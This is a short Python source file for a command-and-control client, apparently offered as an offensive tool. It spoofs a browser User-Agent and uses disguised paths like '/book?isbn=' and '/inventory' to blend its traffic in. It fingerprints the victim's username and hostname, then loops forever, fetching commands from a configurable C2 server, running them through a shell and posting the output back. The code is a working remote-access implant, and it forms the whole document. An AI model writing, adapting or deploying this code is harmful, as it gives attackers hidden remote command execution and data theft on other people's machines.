# Command and Control client Code

from os import getenv
from subprocess import run, PIPE, STDOUT
from time import sleep, time
from requests import exceptions, get, post
from sys import platform
from os import uname

# Keep the User-Agent look like a modern browser
HEADER = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/557.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded",
    "Accept": "text/plain"
}

# Set a proxy to match what your target network will be using, if you know it
# PROXY = None {"https": "proxy.some-site.com:443"}
PROXY = None

# Port c2 server listens on
PORT = 80

# Set the c2 server's IP address or hostname
C2_SERVER = "localhost"

# Path to use for signifying a command request form a client using HTTP GET
CMD_REQUEST = "/book?isbn="

# Path to use for signifying a command output from client using HTTP POST
CMD_RESPONSE = "/inventory"

# POST variable name to use for assigning to command output from a client
CMD_RESPONSE_KEY = "index"

# Define a sleep delay time in seconds for re-connection attempts
DELAY = 3

# Obtain unique identifiying information
if getenv("OS") == "Windows_NT":
    client = getenv("USERNAME", "") + "@" + getenv("COMPUTERNAME", "") + "@" + str(time())
elif platform == "linux" or platform == "linux2":
    client = getenv("USER", "") + "@" + uname().nodename + "@" + str(time())
elif platform == "darwin":
    client = getenv("USER", "") + "@" + uname().nodename + "@" + str(time())
else:
    client = "unknown" + "@" + "unknown" + "@" + str(time())

while True:
    # Try an HTTP GET request to the c2 server and retrive a response; if it fails, keep trying forever
    try:
        response = get(url=f"http://{C2_SERVER}:{PORT}{CMD_REQUEST}{client}", headers=HEADER, proxies=PROXY)
    except exceptions.RequestException:
        sleep(DELAY)
        continue
    
    # Retrieve the command via the decoded content ot the response object
    command = response.content.decode()

    # Run our operating system command via the subprocess module's run function
    command_output = run(command, shell=True, stdout=PIPE, stderr=STDOUT).stdout

    # Send the command output to the c2 server
    post(url=f"http://{C2_SERVER}:{PORT}{CMD_RESPONSE}", data={CMD_RESPONSE_KEY: command_output}, headers=HEADER, proxies=PROXY)

    print(response.status_code)